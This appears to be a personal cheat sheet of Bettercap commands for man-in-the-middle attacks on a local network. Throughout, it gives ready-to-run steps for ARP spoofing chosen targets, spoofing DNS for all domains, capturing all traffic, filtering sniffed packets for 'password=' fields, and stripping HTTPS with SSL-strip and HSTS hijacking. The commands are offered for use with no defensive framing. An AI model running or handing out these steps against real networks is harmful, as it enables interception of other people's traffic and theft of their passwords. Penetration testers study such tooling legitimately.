#!/bin/sh

##-==================================================================-##
##   [+] Bettercap - MITM framework - Swiss Army knife for 802.11
##-==================================================================-##
bettercap -iface eth0 -X --proxy -O $File.log

bettercap -iface eth0 -caplet $File.cap



##-===========================-##
##   [+] Bettercap - WebUI 
##-===========================-##
bettercap -caplet http-ui

bettercap -caplet https-ui -iface eth0





bettercap -eval "set arp.spoof.targets $IP; arp.spoof on"



## ----------------------------------------------------- ##
##   [?] Bettercap - DNS Spoof Module - DNS Spoofing
## ----------------------------------------------------- ##
dns.spoof on
set dns.spoof.domains
set dns.spoof.address 
set dns.spoof.all true


## ------------------------------------------------------------ ##
##   [?] Bettercap - Net Sniff Module - Full Traffic Capture
## ------------------------------------------------------------ ##
net.sniff on
set net.sniff.local true
set net.sniff.verbose 'true'
set net.sniff.output 'capture.pcap'




## --------------------------------------------------------- ##
##   [?] Bettercap - Net Sniff Module - Password Sniffing
## --------------------------------------------------------- ##
net.sniff on
set net.sniff.local true
set net.sniff.verbose 'true'
set net.sniff.regexp '.*password=.+'
set net.sniff.output 'passwords.pcap'




## --------------------------------------------------------- ##
##   [?] Bettercap - HTTPS Proxy
## --------------------------------------------------------- ##
arp.spoof on
http.proxy on
set net.sniff.verbose 'true'
set https.proxy.sslstrip true
set arp.spoof.targets $IP
hstshiack/hstshijack
net.sniff on




bettercap -eval "help net.recon; q"


